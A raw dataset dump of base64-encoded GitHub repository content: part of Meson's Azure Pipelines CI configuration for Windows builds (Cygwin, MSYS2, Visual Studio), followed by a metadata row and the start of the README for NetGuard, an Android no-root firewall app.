OiB2czIwMTcKICBwb29sOgogICAgdm1JbWFnZTogVlMyMDE3LVdpbjIwMTYK
CiAgc3RyYXRlZ3k6CiAgICBtYXRyaXg6CiAgICAgICAgdmMyMDE3eDY0bmlu
amE6CiAgICAgICAgICBhcmNoOiB4NjQKICAgICAgICAgIGNvbXBpbGVyOiBt
c3ZjMjAxNwogICAgICAgICAgYmFja2VuZDogbmluamEKICAgICAgICB2YzIw
MTd4NjR2czoKICAgICAgICAgIGFyY2g6IHg2NAogICAgICAgICAgY29tcGls
ZXI6IG1zdmMyMDE3CiAgICAgICAgICBiYWNrZW5kOiB2czIwMTcKICAgICAg
ICBjbGFuZ2NseDY0bmluamE6CiAgICAgICAgICBhcmNoOiB4NjQKICAgICAg
ICAgIGNvbXBpbGVyOiBjbGFuZy1jbAogICAgICAgICAgYmFja2VuZDogbmlu
amEKCiAgc3RlcHM6CiAgLSB0YXNrOiBVc2VQeXRob25WZXJzaW9uQDAKICAg
IGlucHV0czoKICAgICAgdmVyc2lvblNwZWM6ICczLjUnCiAgICAgIGFkZFRv
UGF0aDogdHJ1ZQogICAgICBhcmNoaXRlY3R1cmU6ICd4NjQnCiAgLSB0ZW1w
bGF0ZTogY2kvYXp1cmUtc3RlcHMueW1sCgotIGpvYjogdnMyMDE5CiAgcG9v
bDoKICAgIHZtSW1hZ2U6IHdpbmRvd3MtMjAxOQoKICBzdHJhdGVneToKICAg
IG1hdHJpeDoKICAgICAgICB2YzIwMTl4NjRuaW5qYToKICAgICAgICAgIGFy
Y2g6IHg2NAogICAgICAgICAgY29tcGlsZXI6IG1zdmMyMDE5CiAgICAgICAg
ICBiYWNrZW5kOiBuaW5qYQogICAgICAgIHZjMjAxOXg2NHZzOgogICAgICAg
ICAgYXJjaDogeDY0CiAgICAgICAgICBjb21waWxlcjogbXN2YzIwMTkKICAg
ICAgICAgIGJhY2tlbmQ6IHZzMjAxOQoKICBzdGVwczoKICAtIHRhc2s6IFVz
ZVB5dGhvblZlcnNpb25AMAogICAgaW5wdXRzOgogICAgICB2ZXJzaW9uU3Bl
YzogJzMuNycKICAgICAgYWRkVG9QYXRoOiB0cnVlCiAgICAgIGFyY2hpdGVj
dHVyZTogJ3g2NCcKICAtIHRlbXBsYXRlOiBjaS9henVyZS1zdGVwcy55bWwK
Ci0gam9iOiBjeWd3aW4KICBwb29sOgogICAgdm1JbWFnZTogVlMyMDE3LVdp
bjIwMTYKICBzdHJhdGVneToKICAgIG1hdHJpeDoKICAgICAgICBnY2N4NjRu
aW5qYToge30KICB2YXJpYWJsZXM6CiAgICBDWUdXSU5fUk9PVDogJChTeXN0
ZW0uV29ya2ZvbGRlcilcY3lnd2luCiAgICBDWUdXSU5fTUlSUk9SOiBodHRw
Oi8vY3lnd2luLm1pcnJvci5jb25zdGFudC5jb20KICBzdGVwczoKICAgIC0g
c2NyaXB0OiB8CiAgICAgICAgY2hvY28gaW5zdGFsbCBjeWd3aW4gLS1wYXJh
bXM9Ii9JbnN0YWxsRGlyOiVDWUdXSU5fUk9PVCUiCiAgICAgIGRpc3BsYXlO
YW1lOiBJbnN0YWxsIEN5Z3dpbgogICAgLSBzY3JpcHQ6IHwKICAgICAgICAl
Q1lHV0lOX1JPT1QlXGN5Z3dpbnNldHVwLmV4ZSAtcW5OZE8gLVIgIiVDWUdX
SU5fUk9PVCUiIC1zICIlQ1lHV0lOX01JUlJPUiUiIC1nIC1QIF4KICAgICAg
ICBnY2MtZm9ydHJhbixeCiAgICAgICAgZ2NjLW9iamMrKyxeCiAgICAgICAg
Z2NjLW9iamMsXgogICAgICAgIGdpdCxeCiAgICAgICAgZ29iamVjdC1pbnRy
b3NwZWN0aW9uLF4KICAgICAgICBsaWJhcmNoaXZlMTMsXgogICAgICAgIGxp
YmJvb3N0LWRldmVsLF4KICAgICAgICBsaWJnbGliMi4wLWRldmVsLF4KICAg
ICAgICBsaWJndGszLWRldmVsLF4KICAgICAgICBsaWJqc29uY3BwMTksXgog
ICAgICAgIGxpYnJoYXNoMCxeCiAgICAgICAgbGlidXYxLF4KICAgICAgICBu
aW5qYSxeCiAgICAgICAgcHl0aG9uMi1kZXZlbCxeCiAgICAgICAgcHl0aG9u
My1kZXZlbCxeCiAgICAgICAgcHl0aG9uMzYtcGlwLF4KICAgICAgICB2YWxh
LF4KICAgICAgICB3Z2V0LF4KICAgICAgICBjbWFrZSxeCiAgICAgICAgemxp
Yi1kZXZlbAogICAgICBkaXNwbGF5TmFtZTogSW5zdGFsbCBEZXBlbmRlbmNp
ZXMKICAgIC0gc2NyaXB0OiB8CiAgICAgICAgc2V0IFBBVEg9JUNZR1dJTl9S
T09UJVxiaW47JVNZU1RFTVJPT1QlXHN5c3RlbTMyCiAgICAgICAgZW52LmV4
ZSAtLSBweXRob24zIC1tIHBpcCAtLWRpc2FibGUtcGlwLXZlcnNpb24tY2hl
Y2sgaW5zdGFsbCBweXRlc3QteGRpc3QKICAgICAgZGlzcGxheU5hbWU6IHBp
cCBpbnN0YWxsIHB5dGVzdC14ZGlzdAogICAgLSBzY3JpcHQ6IHwKICAgICAg
ICBzZXQgQk9PU1RfUk9PVD0KICAgICAgICBzZXQgUEFUSD0lQ1lHV0lOX1JP
T1QlXGJpbjslU1lTVEVNUk9PVCVcc3lzdGVtMzIKICAgICAgICBlbnYuZXhl
IC0tIHB5dGhvbjMgcnVuX3Rlc3RzLnB5IC0tYmFja2VuZD1uaW5qYQogICAg
ICBkaXNwbGF5TmFtZTogUnVuIFRlc3RzCiAgICAtIHRhc2s6IENvcHlGaWxl
c0AyCiAgICAgIGNvbmRpdGlvbjogbm90KGNhbmNlbGVkKCkpCiAgICAgIGlu
cHV0czoKICAgICAgICBjb250ZW50czogJ21lc29uLXRlc3QtcnVuLionCiAg
ICAgICAgdGFyZ2V0Rm9sZGVyOiAkKEJ1aWxkLkFydGlmYWN0U3RhZ2luZ0Rp
cmVjdG9yeSkKICAgIC0gdGFzazogUHVibGlzaEJ1aWxkQXJ0aWZhY3RzQDEK
ICAgICAgaW5wdXRzOgogICAgICAgIGFydGlmYWN0TmFtZTogJChTeXN0ZW0u
Sm9iTmFtZSkKICAgICAgIyBwdWJsaXNoaW5nIGFydGlmYWN0cyBmcm9tIFBS
cyBmcm9tIGEgZm9yayBpcyBjdXJyZW50bHkgYmxvY2tlZAogICAgICBjb25k
aXRpb246IGFuZChlcSh2YXJpYWJsZXNbJ3N5c3RlbS5wdWxscmVxdWVzdC5p
c2ZvcmsnXSwgZmFsc2UpLCBub3QoY2FuY2VsZWQoKSkpCiAgICAtIHRhc2s6
IFB1Ymxpc2hUZXN0UmVzdWx0c0AyCiAgICAgIGNvbmRpdGlvbjogbm90KGNh
bmNlbGVkKCkpCiAgICAgIGlucHV0czoKICAgICAgICB0ZXN0UmVzdWx0c0Zp
bGVzOiBtZXNvbi10ZXN0LXJ1bi54bWwKICAgICAgICB0ZXN0UnVuVGl0bGU6
ICQoU3lzdGVtLkpvYk5hbWUpCgotIGpvYjogbXN5czIKICBwb29sOgogICAg
dm1JbWFnZTogVlMyMDE3LVdpbjIwMTYKICBzdHJhdGVneToKICAgIG1hdHJp
eDoKICAgICAgZ2NjeDg2bmluamE6CiAgICAgICAgTVNZU1RFTTogTUlOR1cz
MgogICAgICAgIE1TWVMyX0FSQ0g6IGk2ODYKICAgICAgICBjb21waWxlcjog
Z2NjCiAgICAgIGdjY3g2NG5pbmphOgogICAgICAgIE1TWVNURU06IE1JTkdX
NjQKICAgICAgICBNU1lTMl9BUkNIOiB4ODZfNjQKICAgICAgICBjb21waWxl
cjogZ2NjCiAgICAgIGNsYW5neDY0bmluamE6CiAgICAgICAgTVNZU1RFTTog
TUlOR1c2NAogICAgICAgIE1TWVMyX0FSQ0g6IHg4Nl82NAogICAgICAgIGNv
bXBpbGVyOiBjbGFuZwogIHZhcmlhYmxlczoKICAgIE1TWVMyX1JPT1Q6ICQo
U3lzdGVtLldvcmtmb2xkZXIpXG1zeXM2NAogIHN0ZXBzOgogICAgLSBzY3Jp
cHQ6IHwKICAgICAgICBjaG9jbyBpbnN0YWxsIG1zeXMyIC0tcGFyYW1zPSIv
SW5zdGFsbERpcjolTVNZUzJfUk9PVCUgL05vVXBkYXRlIC9Ob1BhdGgiCiAg
ICAgIGRpc3BsYXlOYW1lOiBJbnN0YWxsIE1TWVMyCiAgICAtIHNjcmlwdDog
fAogICAgICAgIHNldCBQQVRIPSVNU1lTMl9ST09UJVx1c3JcYmluOyVTeXN0
ZW1Sb290JVxzeXN0ZW0zMjslU3lzdGVtUm9vdCU7JVN5c3RlbVJvb3QlXFN5
c3RlbTMyXFdiZW0KICAgICAgICAlTVNZUzJfUk9PVCVcdXNyXGJpblxwYWNt
YW4gLS1ub2NvbmZpcm0gLVN5eXV1CiAgICAgICAgJU1TWVMyX1JPT1QlXHVz
clxiaW5ccGFjbWFuIC0tbm9jb25maXJtIC1TeXV1CiAgICAgIGRpc3BsYXlO
YW1lOiBVcGRhdGUgTVNZUzIKICAgIC0gc2NyaXB0OiB8CiAgICAgICAgc2V0
IFBBVEg9JU1TWVMyX1JPT1QlXHVzclxiaW47JVN5c3RlbVJvb3QlXHN5c3Rl
bTMyOyVTeXN0ZW1Sb290JTslU3lzdGVtUm9vdCVcU3lzdGVtMzJcV2JlbQog
ICAgICAgIGlmICVjb21waWxlciU9PWdjYyAoIHNldCAiVE9PTENIQUlOPW1p
bmd3LXc2NC0kKE1TWVMyX0FSQ0gpLXRvb2xjaGFpbiIgKSBlbHNlICggc2V0
ICJUT09MQ0hBSU49bWluZ3ctdzY0LSQoTVNZUzJfQVJDSCktY2xhbmciICkK
ICAgICAgICAlTVNZUzJfUk9PVCVcdXNyXGJpblxwYWNtYW4gLS1ub2NvbmZp
cm0gLS1uZWVkZWQgLVMgXgogICAgICAgIGJhc2UtZGV2ZWwgXgogICAgICAg
IGdpdCBeCiAgICAgICAgbWVyY3VyaWFsIF4KICAgICAgICBtaW5ndy13NjQt
JChNU1lTMl9BUkNIKS1jbWFrZSBeCiAgICAgICAgbWluZ3ctdzY0LSQoTVNZ
UzJfQVJDSCktbmluamEgXgogICAgICAgIG1pbmd3LXc2NC0kKE1TWVMyX0FS
Q0gpLXBrZy1jb25maWcgXgogICAgICAgIG1pbmd3LXc2NC0kKE1TWVMyX0FS
Q0gpLXB5dGhvbjIgXgogICAgICAgIG1pbmd3LXc2NC0kKE1TWVMyX0FSQ0gp
LXB5dGhvbjMgXgogICAgICAgIG1pbmd3LXc2NC0kKE1TWVMyX0FSQ0gpLXB5
dGhvbjMtc2V0dXB0b29scyBeCiAgICAgICAgJVRPT0xDSEFJTiUKICAgICAg
ZGlzcGxheU5hbWU6IEluc3RhbGwgRGVwZW5kZW5jaWVzCiAgICAtIHBvd2Vy
c2hlbGw6IHwKICAgICAgICAjIGh0dHBzOi8vZ2l0aHViLmNvbS9tZXNvbmJ1
aWxkL21lc29uL2lzc3Vlcy81ODA3CiAgICAgICAgIyBodHRwczovL2dpdGh1
Yi5jb20vbXN5czIvTUlOR1ctcGFja2FnZXMvaXNzdWVzLzU3MTkjaXNzdWVj
b21tZW50LTUyNTg0NTc2OQogICAgICAgIGlmICgkZW52OmNvbXBpbGVyIC1l
cSAnZ2NjJykgewogICAgICAgICAgKE5ldy1PYmplY3QgbmV0LndlYmNsaWVu
dCkuRG93bmxvYWRGaWxlKCJodHRwczovL2dpdGh1Yi5jb20vbWVzb25idWls
ZC9jaWRhdGEvcmF3L21hc3Rlci93aW4zMi9zZXRkbGxjaGFyYWN0ZXJpc3Rp
Y3MuZXhlIiwgIiQoU3lzdGVtLldvcmtGb2xkZXIpXHNldGRsbGNoYXJhY3Rl
cmlzdGljcy5leGUiKQogICAgICAgICAgaWYgKCRlbnY6TVNZUzJfQVJDSCAt
ZXEgJ3g4Nl82NCcpIHsKICAgICAgICAgICAgJChTeXN0ZW0uV29ya0ZvbGRl
cilcc2V0ZGxsY2hhcmFjdGVyaXN0aWNzIC1kICRlbnY6TVNZUzJfUk9PVFxt
aW5ndzY0XGxpYlxnY2NceDg2XzY0LXc2NC1taW5ndzMyXDkuMi4wXGNjMS5l
eGUKICAgICAgICAgICAgJChTeXN0ZW0uV29ya0ZvbGRlcilcc2V0ZGxsY2hh
cmFjdGVyaXN0aWNzIC1kICRlbnY6TVNZUzJfUk9PVFxtaW5ndzY0XGxpYlxn
Y2NceDg2XzY0LXc2NC1taW5ndzMyXDkuMi4wXGNjMXBsdXMuZXhlCiAgICAg
ICAgICB9IGVsc2UgewogICAgICAgICAgICAkKFN5c3RlbS5Xb3JrRm9sZGVy
KVxzZXRkbGxjaGFyYWN0ZXJpc3RpY3MgLWQgJGVudjpNU1lTMl9ST09UXG1p
bmd3MzJcbGliXGdjY1xpNjg2LXc2NC1taW5ndzMyXDkuMi4wXGNjMS5leGUK
ICAgICAgICAgICAgJChTeXN0ZW0uV29ya0ZvbGRlcilcc2V0ZGxsY2hhcmFj
dGVyaXN0aWNzIC1kICRlbnY6TVNZUzJfUk9PVFxtaW5ndzMyXGxpYlxnY2Nc
aTY4Ni13NjQtbWluZ3czMlw5LjIuMFxjYzFwbHVzLmV4ZQogICAgICAgICAg
fQogICAgICAgIH0KICAgICAgZGlzcGxheU5hbWU6IE1TWVMyIFBDSCBoYWNr
CiAgICAtIHNjcmlwdDogfAogICAgICAgIHNldCBCT09TVF9ST09UPQogICAg
ICAgIHNldCBQQVRIPSVTeXN0ZW1Sb290JVxzeXN0ZW0zMjslU3lzdGVtUm9v
dCU7JVN5c3RlbVJvb3QlXFN5c3RlbTMyXFdiZW0KICAgICAgICBzZXQgUEFU
SEVYVD0lUEFUSEVYVCU7LnB5CiAgICAgICAgaWYgJWNvbXBpbGVyJT09Y2xh
bmcgKCBzZXQgQ0M9Y2xhbmcgJiYgc2V0IENYWD1jbGFuZysrICYmIHNldCBP
QkpDPWNsYW5nICYmIHNldCBPQkpDWFg9Y2xhbmcrKyApCiAgICAgICAgJU1T
WVMyX1JPT1QlXHVzclxiaW5cYmFzaCAtbGMgIk1TWVNURU09IHB5dGhvbjMg
cnVuX3Rlc3RzLnB5IC0tYmFja2VuZD1uaW5qYSIKICAgICAgZW52OgogICAg
ICAgIENIRVJFX0lOVk9LSU5HOiB5ZXMKICAgICAgZGlzcGxheU5hbWU6IFJ1
biBUZXN0cwogICAgLSB0YXNrOiBDb3B5RmlsZXNAMgogICAgICBjb25kaXRp
b246IG5vdChjYW5jZWxlZCgpKQogICAgICBpbnB1dHM6CiAgICAgICAgY29u
dGVudHM6ICdtZXNvbi10ZXN0LXJ1bi4qJwogICAgICAgIHRhcmdldEZvbGRl
cjogJChCdWlsZC5BcnRpZmFjdFN0YWdpbmdEaXJlY3RvcnkpCiAgICAtIHRh
c2s6IFB1Ymxpc2hCdWlsZEFydGlmYWN0c0AxCiAgICAgIGlucHV0czoKICAg
ICAgICBhcnRpZmFjdE5hbWU6ICQoU3lzdGVtLkpvYk5hbWUpCiAgICAgICMg
cHVibGlzaGluZyBhcnRpZmFjdHMgZnJvbSBQUnMgZnJvbSBhIGZvcmsgaXMg
Y3VycmVudGx5IGJsb2NrZWQKICAgICAgY29uZGl0aW9uOiBhbmQoZXEodmFy
aWFibGVzWydzeXN0ZW0ucHVsbHJlcXVlc3QuaXNmb3JrJ10sIGZhbHNlKSwg
bm90KGNhbmNlbGVkKCkpKQogICAgLSB0YXNrOiBQdWJsaXNoVGVzdFJlc3Vs
dHNAMgogICAgICBjb25kaXRpb246IG5vdChjYW5jZWxlZCgpKQogICAgICBp
bnB1dHM6CiAgICAgICAgdGVzdFJlc3VsdHNGaWxlczogbWVzb24tdGVzdC1y
dW4ueG1sCiAgICAgICAgdGVzdFJ1blRpdGxlOiAkKFN5c3RlbS5Kb2JOYW1l
KQo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'NetGuard',44877925,b'A simple way to block access to the internet per application',b'Java',2,2384,,2384,False,b'https://api.github.com/repos/M66B/NetGuard/forks',"IyBOZXRHdWFyZAoKKk5ldEd1YXJkKiBwcm92aWRlcyBzaW1wbGUgYW5kIGFk
dmFuY2VkIHdheXMgdG8gYmxvY2sgYWNjZXNzIHRvIHRoZSBpbnRlcm5ldCAt
IG5vIHJvb3QgcmVxdWlyZWQuCkFwcGxpY2F0aW9ucyBhbmQgYWRkcmVzc2Vz
IGNhbiBpbmRpdmlkdWFsbHkgYmUgYWxsb3dlZCBvciBkZW5pZWQgYWNjZXNz
IHRvIHlvdXIgV2ktRmkgYW5kL29yIG1vYmlsZSBjb25uZWN0aW9uLgoKQmxv
Y2tpbmcgYWNjZXNzIHRvIHRoZSBpbnRlcm5ldCBjYW4gaGVscDoKCiogcmVk
dWNlIHlvdXIgZGF0YSB1c2FnZQoqIHNhdmUgeW91ciBiYXR0ZXJ5CiogaW5j
cmVhc2UgeW91ciBwcml2YWN5CgpOZXRHdWFyZCBpcyB0aGUgZmlyc3QgZnJl
ZSBhbmQgb3BlbiBzb3VyY2Ugbm8tcm9vdCBmaXJld2FsbCBmb3IgQW5kcm9p
ZC4KCkZlYXR1cmVzOgoKKiBTaW1wbGUgdG8gdXNlCiogTm8gcm9vdCByZXF1
aXJlZAoqIDEwMCUgb3BlbiBzb3VyY2UKKiBObyBjYWxsaW5nIGhvbWUKKiBO
byB0cmFja2luZyBvciBhbmFseXRpY3MKKiBBY3RpdmVseSBkZXZlbG9wZWQg
YW5kIHN1cHBvcnRlZAoqIEFuZHJvaWQgNS4xIGFuZCBsYXRlciBzdXBwb3J0
ZWQKKiBJUHY0L0lQdjYgVENQL1VEUCBzdXBwb3J0ZWQKKiBUZXRoZXJpbmcg
c3VwcG9ydGVkCiogT3B0aW9uYWxseSBhbGxvdyB3aGVuIHNjcmVlbiBvbgoq
IE9wdGlvbmFsbHkgYmxvY2sgd2hlbiByb2FtaW5nCiogT3B0aW9uYWxseSBi
bG9jayBzeXN0ZW0gYXBwbGljYXRpb25zCiogT3B0aW9uYWxseSBmb3J3YXJk
IHBvcnRzLCBhbHNvIHRvIGV4dGVybmFsIGFkZHJlc3NlcyAobm90IGF2YWls
YWJsZSBpZiBpbnN0YWxsZWQgZnJvbSB0aGUgUGxheSBzdG9yZSkKKiBPcHRp
b25hbGx5IG5vdGlmeSB3aGVuIGFuIGFwcGxpY2F0aW9uIGFjY2Vzc2VzIHRo
ZSBpbnRlcm5ldAoqIE9wdGlvbmFsbHkgcmVjb3JkIG5ldHdvcmsgdXNhZ2Ug
cGVyIGFwcGxpY2F0aW9uIHBlciBhZGRyZXNzCiogT3B0aW9uYWxseSBbYmxv
Y2sgYWRzIHVzaW5nIGEgaG9zdHMgZmlsZV0oaHR0cHM6Ly9naXRodWIuY29t
L002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvQURCTE9DS0lORy5tZCkgKG5v
dCBhdmFpbGFibGUgaWYgaW5zdGFsbGVkIGZyb20gdGhlIFBsYXkgc3RvcmUp
CiogTWF0ZXJpYWwgZGVzaWduIHRoZW1lIHdpdGggbGlnaHQgYW5kIGRhcmsg
dGhlbWUKClBSTyBmZWF0dXJlczoKCiogTG9nIGFsbCBvdXRnb2luZyB0cmFm
ZmljOyBzZWFyY2ggYW5kIGZpbHRlciBhY2Nlc3MgYXR0ZW1wdHM7IGV4cG9y
dCBQQ0FQIGZpbGVzIHRvIGFuYWx5emUgdHJhZmZpYwoqIEFsbG93L2Jsb2Nr
IGluZGl2aWR1YWwgYWRkcmVzc2VzIHBlciBhcHBsaWNhdGlvbgoqIE5ldyBh
cHBsaWNhdGlvbiBub3RpZmljYXRpb25zOyBjb25maWd1cmUgTmV0R3VhcmQg
ZGlyZWN0bHkgZnJvbSB0aGUgbm90aWZpY2F0aW9uCiogRGlzcGxheSBuZXR3
b3JrIHNwZWVkIGdyYXBoIGluIGEgc3RhdHVzIGJhciBub3RpZmljYXRpb24K
KiBTZWxlY3QgZnJvbSBmaXZlIGFkZGl0aW9uYWwgdGhlbWVzIGluIGJvdGgg
bGlnaHQgYW5kIGRhcmsgdmVyc2lvbgoKVGhlcmUgaXMgbm8gb3RoZXIgbm8t
cm9vdCBmaXJld2FsbCBvZmZlcmluZyBhbGwgdGhlc2UgZmVhdHVyZXMuCgpS
ZXF1aXJlbWVudHM6CgoqIEFuZHJvaWQgNS4xIG9yIGxhdGVyCiogQSBbY29t
cGF0aWJsZSBkZXZpY2VdKCNjb21wYXRpYmlsaXR5KQoKRG93bmxvYWRzOgoK
KiBbR2l0SHViXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9y
ZWxlYXNlcykKKiBbR29vZ2xlIFBsYXldKGh0dHBzOi8vcGxheS5nb29nbGUu
Y29tL3N0b3JlL2FwcHMvZGV0YWlscz9pZD1ldS5mYWlyY29kZS5uZXRndWFy
ZCkKCkNlcnRpZmljYXRlIGZpbmdlcnByaW50czoKCiogTUQ1OiBCNjo0QTpF
ODowODoxQzozQzo5QzoxOTpENjo5RToyOTowMDo0Njo4OTpEQTo3MwoqIFNI
QTE6IEVGOjQ2OkY4OjEzOkQyOkM4OkEwOjY0OkQ3OjJDOjkzOjZCOjlCOjk2
OkQxOkNDOkNDOjk4OjkzOjc4CiogU0hBMjU2OiBFNDpBMjo2MDpBMjpEQzpF
NzpCNzpBRjoyMzpFRTo5MTo5Qzo0ODo5RToxNTpGRDowMTowMjpCOTozRjo5
RTo3Qzo5RDo4MjpCMDo5QzowQjozOTo1MDowMDpFNDpENAoKVXNhZ2U6Cgoq
IEVuYWJsZSB0aGUgZmlyZXdhbGwgdXNpbmcgdGhlIHN3aXRjaCBpbiB0aGUg
YWN0aW9uIGJhcgoqIEFsbG93L2RlbnkgV2ktRmkvbW9iaWxlIGludGVybmV0
IGFjY2VzcyB1c2luZyB0aGUgaWNvbnMgYWxvbmcgdGhlIHJpZ2h0IHNpZGUg
b2YgdGhlIGFwcGxpY2F0aW9uIGxpc3QKCllvdSBjYW4gdXNlIHRoZSBzZXR0
aW5ncyBtZW51IHRvIGNoYW5nZSBmcm9tIGJsYWNrbGlzdCBtb2RlIChhbGxv
dyBhbGwgaW4gKlNldHRpbmdzKiBidXQgYmxvY2sgdW53YW50ZWQgYXBwbGlj
YXRpb25zIGluIGxpc3QpIHRvIHdoaXRlbGlzdCBtb2RlIChibG9jayBhbGwg
aW4gKlNldHRpbmdzKiBidXQgYWxsb3cgZmF2b3JpdGUgYXBwbGljYXRpb25z
IGluIGxpc3QpLgoKKiBSZWQvb3JhbmdlL3llbGxvdy9hbWJlciA9IGludGVy
bmV0IGFjY2VzcyBkZW5pZWQKKiBUZWFsL2JsdWUvcHVycGxlL2dyZXkgPSBp
bnRlcm5ldCBhY2Nlc3MgYWxsb3dlZAoKPGltZyBzcmM9Imh0dHBzOi8vcmF3
LmdpdGh1YnVzZXJjb250ZW50LmNvbS9NNjZCL05ldEd1YXJkL21hc3Rlci9z
Y3JlZW5zaG90cy8wMS1tYWluLnBuZyIgd2lkdGg9IjMyMCIgaGVpZ2h0PSI1
NjkiIC8+CjxpbWcgc3JjPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVu
dC5jb20vTTY2Qi9OZXRHdWFyZC9tYXN0ZXIvc2NyZWVuc2hvdHMvMDItbWFp
bi1kZXRhaWxzLnBuZyIgd2lkdGg9IjMyMCIgaGVpZ2h0PSI1NjkiIC8+Cjxp
bWcgc3JjPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vTTY2
Qi9OZXRHdWFyZC9tYXN0ZXIvc2NyZWVuc2hvdHMvMDMtbWFpbi1hY2Nlc3Mu
cG5nIiB3aWR0aD0iMzIwIiBoZWlnaHQ9IjU2OSIgLz4KPGltZyBzcmM9Imh0
dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9NNjZCL05ldEd1YXJk
L21hc3Rlci9zY3JlZW5zaG90cy8wOC1ub3RpZmljYXRpb25zLnBuZyIgd2lk
dGg9IjMyMCIgaGVpZ2h0PSI1NjkiIC8+CgpGb3IgbW9yZSBzY3JlZW5zaG90
cywgc2VlIFtoZXJlXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFy
ZC90cmVlL21hc3Rlci9zY3JlZW5zaG90cykuCgpDb21wYXRpYmlsaXR5Ci0t
LS0tLS0tLS0tLS0KClRoZSBvbmx5IHdheSB0byBidWlsZCBhIG5vLXJvb3Qg
ZmlyZXdhbGwgb24gQW5kcm9pZCBpcyB0byB1c2UgdGhlIEFuZHJvaWQgVlBO
IHNlcnZpY2UuCkFuZHJvaWQgZG9lc24ndCBhbGxvdyBjaGFpbmluZyBvZiBW
UE4gc2VydmljZXMsIHNvIHlvdSBjYW5ub3QgdXNlIE5ldEd1YXJkIHRvZ2V0
aGVyIHdpdGggb3RoZXIgVlBOIGJhc2VkIGFwcGxpY2F0aW9ucy4KU2VlIGFs
c28gW3RoaXMgRkFRXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFy
ZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTIpLgoKTmV0
R3VhcmQgY2FuIGJlIHVzZWQgb24gcm9vdGVkIGRldmljZXMgdG9vIGFuZCBl
dmVuIG9mZmVycyBtb3JlIGZlYXR1cmVzIHRoYW4gbW9zdCByb290IGZpcmV3
YWxscy4KClNvbWUgQW5kcm9pZCB2ZXJzaW9ucywgZXhwZWNpYWxseSBub3Qg
dXBkYXRlZCBTYW1zdW5nIEFuZHJvaWQgdmVyc2lvbnMsIGhhdmUgYSBidWdn
eSBWUE4gaW1wbGVtZW50YXRpb24sCndoaWNoIHJlc3VsdHMgaW4gQW5kcm9p
ZCByZWZ1c2luZyB0byBzdGFydCB0aGUgVlBOIHNlcnZpY2UgaW4gY2VydGFp
biBjaXJjdW1zdGFuY2VzLApsaWtlIHdoZW4gdGhlcmUgaXMgbm8gaW50ZXJu
ZXQgY29ubmNlY3Rpdml0eSB5ZXQgKHdoZW4gc3RhcnRpbmcgdXAgeW91ciBk
ZXZpY2UpCm9yIHdoZW4gaW5jb3JyZWN0bHkgcmVxdWlyaW5nIG1hbnVhbCBh
cHByb3ZhbCBvZiB0aGUgVlBOIHNlcnZpY2UgYWdhaW4gKHdoZW4gc3RhcnRp
bmcgdXAgeW91ciBkZXZpY2UpLgpVbmZvcnR1bmF0ZWx5IHRoZXNlIEFuZHJv
aWQgYnVncyBjYW5ub3QgYmUgd29ya2VkIGFyb3VuZCBieSBOZXRHdWFyZC4K
CkZpbHRlcmluZyBtb2RlIGNhbm5vdCBiZSB1c2VkIG9uIFtDb3BwZXJoZWFk
T1NdKGh0dHBzOi8vY29wcGVyaGVhZC5jby9hbmRyb2lkLykuCgpOZXRHdWFy
ZCB3aWxsIG5vdCB3b3JrIG9yIGNyYXNoIHdoZW4gdGhlIHBhY2thZ2UgKmNv
bS5hbmRyb2lkLnZwbmRpYWxvZ3MqIGhhcyBiZWVuIHJlbW92ZWQgb3Igb3Ro
ZXJ3aXNlIGlzIHVuYXZhaWxhYmxlLgpSZW1vdmluZyB0aGlzIHBhY2thZ2Ug
aXMgcG9zc2libGUgd2l0aCByb290IHBlcm1pc3Npb25zIG9ubHkuCgpOZXRH
dWFyZCBpcyBzdXBwb3J0ZWQgZm9yIHBob25lcyBhbmQgdGFibGV0cyBvbmx5
LCBzbyBub3QgZm9yIG90aGVyIGRldmljZSB0eXBlcyBsaWtlIG9uIGEgdGVs
ZXZpc2lvbiBvciBpbiBhIGNhci4KCldpLUZpIG9yIElQIGNhbGxpbmcgd2ls
bCBub3Qgd29yayBpZiB5b3VyIHByb3ZpZGVyIHVzZXMgW0lQc2VjXShodHRw
czovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9JUHNlYykgdG8gZW5jcnlwdCB5
b3VyIHBob25lIGNhbGxzLCBTTVMgbWVzc2FnZXMgYW5kL29yIE1NUyBtZXNz
YWdlcywKdW5sZXNzIHRoZXJlIHdhcyBtYWRlIGFuIGV4Y2VwdGlvbiBpbiBO
ZXRHdWFyZCBmb3IgeW91ciBwcm92aWRlciAoY3VycmVudGx5IGZvciBULU1v
YmlsZSBhbmQgVmVyaXpvbikuCkkgYW0gaGFwcHkgdG8gYWRkIGV4Y2VwdGlv
bnMgZm9yIG90aGVyIHByb3ZpZGVycywgYnV0IEkgbmVlZCB0aGUgW01DQ10o
aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTW9iaWxlX2NvdW50cnlf
Y29kZSkgY29kZXMsIFtNTkNdKGh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93
aWtpL01OQykgY29kZXMgYW5kIFtJUCBhZGRyZXNzXShodHRwczovL2VuLndp
a2lwZWRpYS5vcmcvd2lraS9JUF9hZGRyZXNzKSByYW5nZXMgeW91ciBwcm92
aWRlciBpcyB1c2luZy4KQXMgYW4gYWx0ZXJuYXRpdmUgeW91IGNhbiBlbmFi
bGUgdGhlIG9wdGlvbiAnKkRpc2FibGUgb24gY2FsbConLCB3aGljaCBpcyBh
dmFpbGFibGUgc2luY2UgdmVyc2lvbiAyLjExMy4KCgo8YSBuYW1lPSJGQVEi
PjwvYT4KRnJlcXVlbnRseSBBc2tlZCBRdWVzdGlvbnMgKEZBUSkKLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCjxhIG5hbWU9IkZBUTAiPjwv
YT4KWyoqKDApIEhvdyBkbyBJIHVzZSBOZXRHdWFyZD8qKl0oaHR0cHM6Ly9n
